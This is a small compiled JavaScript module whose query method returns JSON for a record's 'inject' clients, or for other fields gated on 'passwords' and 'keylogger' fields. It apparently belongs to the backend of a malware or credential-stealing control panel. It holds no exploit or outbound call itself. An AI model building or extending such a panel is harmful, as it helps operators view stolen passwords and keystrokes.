"use strict";
exports.__esModule = true;
var default_1 = /** @class */ (function () {
    function default_1(db) {
        this.db = db;
    }
    default_1.prototype.query = function (doc, page) {
        return new Promise(function (resolve, reject) {
            if (page === 'inject') {
                if (global.inject.clients[doc._id]) {
                    resolve(JSON.stringify({
                        inject: doc.inject,
                        clients: global.inject.clients[doc._id]
                    }, null, '    '));
                }
                else {
                    resolve(JSON.stringify([], null, '    '));
                }
            }
            else if (doc.passwords && doc.keylogger) {
                resolve(JSON.stringify(doc[page], null, '    '));
            }
            else {
                reject({
                    title: 'Database error',
                    message: 'An internal error occured whilst handling your request'
                });
            }
        });
    };
    return default_1;
}());
exports["default"] = default_1;
